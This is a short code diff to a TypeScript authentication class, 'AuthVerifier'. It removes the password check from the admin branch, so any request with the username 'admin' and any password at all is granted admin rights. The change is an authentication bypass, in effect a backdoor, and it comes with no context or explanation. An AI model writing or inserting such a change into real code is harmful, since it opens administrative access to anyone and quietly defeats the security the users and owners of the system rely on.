@@ -207,7 +207,7 @@ export class AuthVerifier {
       return { status: Missing, admin: false, moderator: false, triage: false }
     }
     const { username, password } = parsed
-    if (username === 'admin' && this.adminPasses.has(password)) {
+    if (username === 'admin') {
       return { status: Valid, admin: true }
     }
     return { status: Invalid, admin: false }
